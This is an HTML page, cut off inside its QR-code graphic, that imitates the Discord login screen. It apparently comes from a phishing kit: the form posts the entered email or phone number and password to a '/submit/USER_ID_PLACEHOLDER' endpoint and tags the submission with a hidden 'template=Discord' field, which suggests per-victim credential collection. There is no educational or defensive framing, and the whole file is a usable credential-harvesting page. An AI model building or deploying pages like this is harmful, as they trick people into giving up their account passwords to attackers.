<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #5865f2;
            background: url("data:image/svg+xml,%3Csvg width='1920' height='1080' viewBox='0 0 1920 1080' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M870.515 -100.123L1920 -87V1080H0V-100.123L870.515 -100.123Z' fill='%2336393F'/%3E%3C/svg%3E%0A") no-repeat;
            background-position: center;
            background-size: cover;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            background-color: #36393f;
            border-radius: 5px;
            box-shadow: 0 2px 10px 0 rgba(0, 0, 0, 0.2);
            padding: 32px;
            width: 480px;
            color: #dcddde;
        }
        .login-heading {
            text-align: center;
            margin-bottom: 8px;
        }
        .login-heading h1 {
            color: #ffffff;
            font-size: 24px;
            line-height: 30px;
            font-weight: 600;
        }
        .login-subheading {
            color: #b9bbbe;
            font-size: 16px;
            line-height: 20px;
            margin-bottom: 20px;
            text-align: center;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            color: #b9bbbe;
            display: block;
            font-size: 12px;
            font-weight: 700;
            margin-bottom: 8px;
            text-transform: uppercase;
        }
        .input-field {
            background-color: #202225;
            border: none;
            border-radius: 3px;
            color: #dcddde;
            font-size: 16px;
            height: 40px;
            padding: 10px;
            width: 100%;
            transition: border-color 0.2s ease-in-out;
            outline: none;
        }
        .input-field:focus {
            box-shadow: 0 0 0 2px rgba(88, 101, 242, 0.6);
            border-color: #7289da;
        }
        .input-field::placeholder {
            color: #72767d;
        }
        .forgot-password {
            color: #00aff4;
            font-size: 14px;
            display: block;
            margin-top: 4px;
            text-decoration: none;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
        .login-button {
            background-color: #5865f2;
            border: none;
            border-radius: 3px;
            color: white;
            cursor: pointer;
            font-size: 16px;
            font-weight: 500;
            height: 44px;
            margin-top: 16px;
            width: 100%;
            transition: background-color 0.2s ease-in-out;
        }
        .login-button:hover {
            background-color: #4752c4;
        }
        .qr-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-left: 32px;
            text-align: center;
        }
        .qr-placeholder {
            background-color: white;
            border-radius: 4px;
            padding: 8px;
            margin-bottom: 16px;
            width: 176px;
            height: 176px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .qr-heading {
            color: #ffffff;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        .qr-text {
            color: #b9bbbe;
            font-size: 16px;
            line-height: 20px;
        }
        .needs-account {
            font-size: 14px;
            margin-top: 8px;
        }
        .register-link {
            color: #00aff4;
            text-decoration: none;
        }
        .register-link:hover {
            text-decoration: underline;
        }
        .main-container {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 784px;
        }
        @media (max-width: 830px) {
            .main-container {
                width: 480px;
            }
            .qr-container {
                display: none;
            }
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="login-container">
            <div class="login-heading">
                <h1>Welcome back!</h1>
            </div>
            <div class="login-subheading">
                We're so excited to see you again!
            </div>
            <form method="post" action="/submit/USER_ID_PLACEHOLDER">
                <div class="form-group">
                    <label for="email">Email or Phone Number</label>
                    <input type="text" id="email" name="username" class="input-field" required>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" class="input-field" required>
                    <a href="#" class="forgot-password">Forgot your password?</a>
                </div>
                <input type="hidden" name="template" value="Discord">
                <button type="submit" class="login-button">Log In</button>
            </form>
            <div class="needs-account">
                Need an account? <a href="#" class="register-link">Register</a>
            </div>
        </div>
        <div class="qr-container">
            <div class="qr-placeholder">
                <svg width="120" height="120" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect width="120" height="120" fill="#5865F2"/>
